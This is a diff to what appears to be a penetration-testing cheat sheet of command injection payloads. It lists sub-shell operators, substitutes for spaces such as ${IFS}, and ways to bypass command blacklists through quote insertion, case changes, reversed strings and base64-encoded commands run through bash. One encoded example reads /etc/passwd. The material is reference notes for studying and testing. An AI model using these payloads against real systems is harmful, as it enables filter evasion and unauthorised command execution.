@@ -17,16 +17,17 @@ Injection Operators
 |Sub-Shell| 	$() 	|%24%28%29 	|Both (Linux-only)|
 
 ### Linux
-
 |Code| 	Description|
 |:----|:----|
 |printenv 	|Can be used to view all environment variables|
+
 ### Spaces 	
 |Code| 	Description|
 |:----|:----|
 |%09 	|Using tabs instead of spaces|
 |${IFS} 	|Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $())|
 |{ls,-la} 	|Commas will be replaced with spaces|
+
 ### Other Characters 	
 |Code| 	Description|
 |:----|:----|
@@ -35,17 +36,27 @@ Injection Operators
 |$(tr '!-}' '"-~'<<<[) 	|Shift character by one ([ -> \)|
 
 ### Blacklisted Command Bypass
+
 ### Character Insertion 	
 |Code| 	Description|
 |:----|:----|
 |' or " 	|Total must be even|
 |$@ or \ 	|Linux only|
+
 ### Case Manipulation 	
+|Code| 	Description|
+|:----|:----|
 |$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") |	Execute command regardless of cases|
 |$(a="WhOaMi";printf %s "${a,,}") 	|Another variation of the technique|
+
 ### Reversed Commands 	
+|Code| 	Description|
+|:----|:----|
 |echo 'whoami' \| rev |	Reverse a string|
 |$(rev<<<'imaohw') 	|Execute reversed command|
+
 ### Encoded Commands 	
+|Code| 	Description|
+|:----|:----|
 |echo -n 'cat /etc/passwd \| grep 33' \| base64 	|Encode a string with base64|
 |bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)| 	Execute b64 encoded string|
